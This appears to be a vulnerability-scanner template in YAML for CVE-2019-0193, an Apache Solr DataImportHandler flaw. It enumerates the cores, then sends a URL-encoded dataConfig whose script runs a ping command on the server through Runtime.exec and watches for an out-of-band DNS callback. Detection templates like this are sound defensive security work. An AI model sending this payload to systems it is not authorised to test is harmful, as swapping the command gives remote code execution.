id: apache-solr-cve-2019-0193
info:
  name: Apache Solr RCE (CVE-2019-0193)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Apache Solr DataImportHandler RCE vulnerability. The DIH configuration can be altered via
    the `dataConfig` parameter allowing arbitrary Java code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-0193
    - https://issues.apache.org/jira/browse/SOLR-13669
  tags: rce,solr
  classification:
    cve-id: CVE-2019-0193
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8

variables:
  ping_payload: "ping -c 1 {{interactsh-url}}"

http:
  - raw:
      - |
        GET /solr/admin/cores?indexInfo=false&wt=json HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: core_name
        internal: true
        regex:
          - '"name":"(.*?)"'
      - type: regex
        name: instance_dir
        internal: true
        regex:
          - '"instanceDir":"(.*?)"'

  - raw:
      - |
        POST /solr/{{core_name}}/dataimport HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest
        Referer: http://{{Hostname}}/solr/

        command=full-import&verbose=false&clean=true&commit=true&debug=true&core=atom&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C%21%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22{{ping_payload}}%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
